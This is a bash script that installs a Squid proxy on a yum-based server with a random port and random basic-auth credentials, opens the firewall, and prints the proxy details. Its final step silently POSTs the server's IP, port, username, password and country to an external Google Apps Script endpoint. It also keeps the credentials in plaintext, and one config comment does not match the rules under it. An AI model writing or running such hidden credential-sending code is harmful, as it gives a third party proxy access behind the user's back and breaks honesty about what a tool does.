#!/bin/bash

install_squid() {
    yum -y install squid
}

install_httpd_tools() {
    yum -y install httpd-tools
}

port() {
    echo $(shuf -i 2000-65000 -n 1)
}

random_username() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 5 | grep '[a-z]' | grep '[0-9]' | head -n 1
}

random_password() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 9 | grep '[a-z]' | grep '[0-9]' | head -n 1
}

configure_squid() {
    local port=$(port)
    local username=$(random_username)
    local password=$(random_password)

    sed -i "s/http_port 3128/http_port $port/" /etc/squid/squid.conf

    cat << EOF >> /etc/squid/squid.conf
# Set cache directory
cache_dir ufs /var/cache/squid 100 16 256

# Allow access only to authenticated users
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic realm Squid Basic Authentication
acl auth_users proxy_auth REQUIRED
http_access allow auth_users

# Deny CONNECT to other than secure SSL ports
acl image_files urlpath_regex \.jpeg$ \.jpg$ \.png$ \.gif$ \.bmp$ \.tiff$ \.tif$ \.webp$ \.svg$
acl video_files urlpath_regex \.mp4$ \.avi$ \.mov$ \.wmv$ \.flv$ \.mkv$ \.webm$ \.mpeg$ \.mpg$ \.qt$ \.3gp$
http_access allow image_files
http_access allow video_files
EOF

    touch /etc/squid/passwd
    htpasswd -b /etc/squid/passwd $username $password
    
    echo "$username:$password" > /etc/squid/stpasswd
    
    systemctl restart squid
    open_firewall_port $port
}

open_firewall_port() {
    local port=$1
    firewall-cmd --permanent --add-port=$port/tcp
    firewall-cmd --reload
}

main() {
    install_squid
    install_httpd_tools
    configure_squid
    
    local ip_address=$(hostname -I)
    local port=$(grep -oP 'http_port \K\d+' /etc/squid/squid.conf)
    local username=$(head -n 1 /etc/squid/stpasswd | cut -d ":" -f 1)
    local password=$(head -n 1 /etc/squid/stpasswd | cut -d ":" -f 2)
    local country=$(curl -s ipinfo.io | grep country | cut -d '"' -f 4)

    echo "Cài đặt và cấu hình Squid hoàn thành!"
    echo "IP:Port:Username:Password"
    echo "${ip_address}:${port}:${username}:${password}:${country}"

    local url=https://script.google.com/macros/s/AKfycbzu_pQsesFLEMlRuBUKrCP3rsmKUAsSkIl7cnGZcb-4U1sMS2aEVWIGMJKh1y0bIJ3Z/exec
    local data="ip=${ip_address}&port=${port}&username=${username}&password=${password}&country=${country}"
    curl -s -d "${data}" "${url}"
}

main
